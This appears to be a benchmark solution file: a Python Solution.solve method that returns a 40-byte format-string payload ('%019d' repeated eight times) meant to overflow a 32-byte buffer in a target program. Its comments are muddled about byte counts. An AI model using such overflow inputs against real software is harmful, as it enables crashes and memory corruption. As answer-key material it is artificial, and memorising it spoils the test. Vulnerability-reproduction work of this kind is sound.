import os
import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Generate a format string that exceeds the 32-byte buffer
        # Using maximum components: flag(2) + width(19) + '.' + precision(19) + 'd' = 42 bytes
        # Ground-truth length is 40, so we need exactly 40 bytes
        # We'll use: "%019d" repeated 8 times = 5 * 8 = 40 bytes
        # This ensures buffer overflow when parsed/constructed
        return b'%019d' * 8